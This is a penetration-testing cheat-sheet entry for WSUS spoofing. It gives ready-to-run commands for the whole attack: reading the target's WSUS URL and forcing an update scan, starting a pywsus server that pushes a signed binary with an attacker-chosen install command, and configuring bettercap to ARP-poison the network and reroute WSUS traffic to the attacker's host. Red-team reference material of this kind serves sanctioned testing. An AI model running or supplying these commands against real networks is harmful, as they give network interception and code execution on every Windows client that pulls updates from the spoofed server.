---
technique: WSUSSpoofing
category: mitm
targets: WSUS Clients
protocols: HTTP, ARP, SMB
remote_capable: true
tags: mitm wsus spoofing pywsus arp-poisoning windows-update ad
---

# WSUSSpoofing

WSUS spoofing abuses clients configured to fetch updates over HTTP. With a MITM position, the attacker redirects update checks to a controlled WSUS service that supplies a Microsoft-signed binary with attacker-controlled installation arguments.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Insecure WSUS | Client policy points to `http://` WSUS rather than HTTPS |
| MITM position | ARP poisoning or another reroute path must redirect client WSUS traffic |
| Signed binary | WSUS payload execution requires a Microsoft-signed executable such as PsExec |

## Windows

### Query WSUS server

#cmd #native #recon

Read the configured WSUS server URL from local Windows Update policy.

```cmd title:"Read configured WSUS server URL"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
```
<!-- cheat -->

### Trigger update scan

#cmd #native #windows-update

Trigger a Windows Update detection cycle from the target host.

```cmd title:"Trigger Windows Update detection"
wuauclt /detectnow
```
<!-- cheat -->

## Linux

### pywsus server

#python #wsus #payload

Start a controlled WSUS server that serves a signed executable with attacker-chosen arguments.

```sh title:"Start pywsus malicious update server"
python3 pywsus.py --host $lhost --port 8530 --executable "$signed_exe" --command "$install_command"
```
<!-- cheat
import tun_ip
var signed_exe
var install_command
-->

### bettercap WSUS proxy protocol

#go #bettercap #wsus

Set bettercap to reroute TCP traffic for WSUS spoofing.

```sh title:"Set bettercap WSUS proxy protocol"
set any.proxy.protocol TCP
```
<!-- cheat -->

### bettercap WSUS source address

#go #bettercap #wsus

Set the legitimate WSUS server address as the traffic source to intercept.

```sh title:"Set legitimate WSUS server as proxy source"
set any.proxy.src_address $wsus_ip
```
<!-- cheat
var wsus_ip
-->

### bettercap WSUS source port

#go #bettercap #wsus

Set the WSUS HTTP port as the traffic source port to intercept.

```sh title:"Set WSUS HTTP source port"
set any.proxy.src_port 8530
```
<!-- cheat -->

### bettercap WSUS destination address

#go #bettercap #wsus

Set the attacker WSUS server address as the reroute destination.

```sh title:"Set attacker WSUS destination address"
set any.proxy.dst_address $lhost
```
<!-- cheat
import tun_ip
-->

### bettercap WSUS destination port

#go #bettercap #wsus

Set the attacker WSUS server port as the reroute destination.

```sh title:"Set attacker WSUS destination port"
set any.proxy.dst_port 8530
```
<!-- cheat -->

### bettercap WSUS caplet

#go #bettercap #caplet

Run a prepared caplet that performs ARP poisoning and WSUS traffic rerouting.

```sh title:"Run WSUS spoofing bettercap caplet"
bettercap --iface $interface --caplet wsus_spoofing.cap
```
<!-- cheat
var interface
-->
